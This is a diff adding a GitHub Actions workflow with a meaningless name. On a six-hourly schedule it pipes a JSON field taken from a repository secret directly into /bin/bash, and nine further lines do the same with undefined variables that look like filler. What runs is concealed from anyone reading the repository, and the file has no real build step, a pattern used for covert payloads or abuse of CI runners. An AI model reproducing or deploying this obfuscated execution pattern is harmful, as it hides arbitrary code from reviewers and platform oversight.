@@ -1,0 +1,27 @@
+name: kongshanxinyutianqi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: kongshanxinyutianqi
+        env:
+          cgn1: ${{ secrets.cgn1 }}
+        run: |
+          echo $cgn1 | jq -r .yg26 | /bin/bash
+          echo $nda8 | jq -r .ki82 | /bin/bash
+          echo $dakjz4201 | jq -r .flr674 | /bin/bash
+          echo $yyifd2 | jq -r .tddix174 | /bin/bash
+          echo $fv25968 | jq -r .g63 | /bin/bash
+          echo $gn991 | jq -r .amp30 | /bin/bash
+          echo $buro9165 | jq -r .clv54 | /bin/bash
+          echo $nf38819 | jq -r .r7 | /bin/bash
+          echo $hawz41 | jq -r .xfgw37 | /bin/bash
+          echo $kuqyd8 | jq -r .ykkwk8 | /bin/bash
+
